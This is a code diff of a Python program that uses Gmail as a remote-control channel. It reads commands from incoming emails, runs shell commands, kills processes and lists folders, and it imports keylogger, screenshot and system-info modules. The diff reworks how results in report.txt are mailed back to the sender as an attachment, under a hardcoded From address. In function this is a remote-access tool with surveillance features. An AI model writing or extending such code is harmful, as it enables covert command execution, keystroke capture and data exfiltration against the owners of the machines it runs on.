@@ -1,7 +1,11 @@
 from __future__ import print_function
+from email.message import EmailMessage
 
+import google.auth
 import time
 import base64
+import mimetypes
+import os
 import os.path
 import Pc
 import ScreenShots
@@ -9,9 +13,9 @@ import MAC_IP
 import SystemInfo
 import TaskManager
 import CommandLine
-import TerminateTask
 import Folder
 import Keylogger
+import re
 
 from google.auth.transport.requests import Request
 from google.oauth2.credentials import Credentials
@@ -23,6 +27,12 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
+
+from email.message import EmailMessage
+from email.mime.audio import MIMEAudio
+from email.mime.base import MIMEBase
+from email.mime.image import MIMEImage
+from email.mime.text import MIMEText
 
 # If modifying these scopes, delete the file token.json.
 SCOPES = ['https://mail.google.com/']
@@ -108,7 +118,7 @@ def checkRequirement(lines):
                 cmd = CommandLine.runShellCommand(command_argument)
                 report = f"Terminal: {cmd}"
             elif command_execute == "Terminate":
-                id = TerminateTask.terminate_process(command_argument)
+                id = TaskManager.terminate_process(command_argument)
                 report = f"Terminate: {id}"
             elif command_execute == "Folder Tree":
                 foldertree = Folder.getFolderTree(command_argument)
@@ -125,30 +135,63 @@ def checkRequirement(lines):
             except Exception as e:
                 print(f"Error writing to file: {e}")
 
-def sendReport(reportPath, recipient_email):
-    global service
+def gmail_send_email_with_attachment(recipient_email):
+    """Create and insert a draft email with attachment.
+       Print the returned draft's message and id.
+      Returns: Draft object, including draft id and message meta data.
 
-    message = MIMEMultipart()
-    message['to'] = recipient_email
-    message['subject'] = "Report"
-
-    msg = MIMEMultipart()
-    msg.attach(MIMEText('Please find the report attached.'))
-
-    attachment = open(reportPath, 'rb')
-    report = MIMEBase('application', 'octet-stream')
-    report.set_payload(attachment.read())
-    encoders.encode_base64(report)
-    report.add_header('Content-Disposition', f'attachment; filename=report.txt')
-    msg.attach(report)
-
-    raw_message = base64.urlsafe_b64encode(msg.as_bytes()).decode()
+      Load pre-authorized user credentials from the environment.
+      TODO(developer) - See https://developers.google.com/identity
+      for guides on implementing OAuth2 for the application.
+    """
+    # creds, _ = google.auth.default()
 
     try:
-        service.users().messages().send(userId='me', body={'raw': raw_message}).execute()
-        print("Report sent successfully!")
+        # create gmail api client
+        mime_message = EmailMessage()
+
+        # headers
+        mime_message['To'] = recipient_email
+        mime_message['From'] = 'atwohohoho@gmail.com'
+        mime_message['Subject'] = "[RDCVE] Report"
+
+        # text
+        mime_message.set_content(
+            'Requirement has been recorded.\n'
+            'Please check the attached file for more details.'
+        )
+
+        # attachment
+        attachment_filename = 'report.txt'
+        # guessing the MIME type
+        type_subtype, _ = mimetypes.guess_type(attachment_filename)
+        maintype, subtype = type_subtype.split('/')
+
+        with open(attachment_filename, 'rb') as fp:
+            attachment_data = fp.read()
+        mime_message.add_attachment(attachment_data, maintype, subtype)
+
+        encoded_message = base64.urlsafe_b64encode(mime_message.as_bytes()).decode()
+
+        create_message = {
+            'message': {
+                'raw': encoded_message
+            }
+        }
+        # pylint: disable=E1101
+        # send_message = (service.users().messages().send(userId="me",
+        #                                                 body=create_message)\
+        #             .execute())
+        # print(F'Message Id: {send_message["id"]}')
+        
+        draft = service.users().drafts().create(userId="me",
+                                                body=create_message)\
+            .execute()
+        print(F'Draft id: {draft["id"]}\nDraft message: {draft["message"]}')
     except HttpError as error:
-        print(f"An error occurred: {error}")
+        print(F'An error occurred: {error}')
+        draft = None
+    return draft
 
 def main():
     global creds
@@ -170,7 +213,7 @@ def main():
                         name = values['name']
                         if name == 'From':
                             print(f"From: {values['value']}") #print the sender address
-                            from_name = values['value']
+                            from_name = re.search(r'<([^>]+)>', values['value']).group(1)
                     for part in msg['payload']['parts']:
                         try:
                             data = part['body']["data"]
@@ -183,7 +226,8 @@ def main():
                                 lines = text.split('\n')
                                 message_count += 1
                                 checkRequirement(lines)
-                                sendReport(reportPath, name)
+                                print(f"HELLO\n")
+                                print (gmail_send_email_with_attachment(from_name))
                             # mark the message as read (optional)
                             # msg = service.users().messages().modify(userId='me', id=message['id'], body={'removeLabelIds': ['UNREAD']}).execute()
                         except BaseException as error:
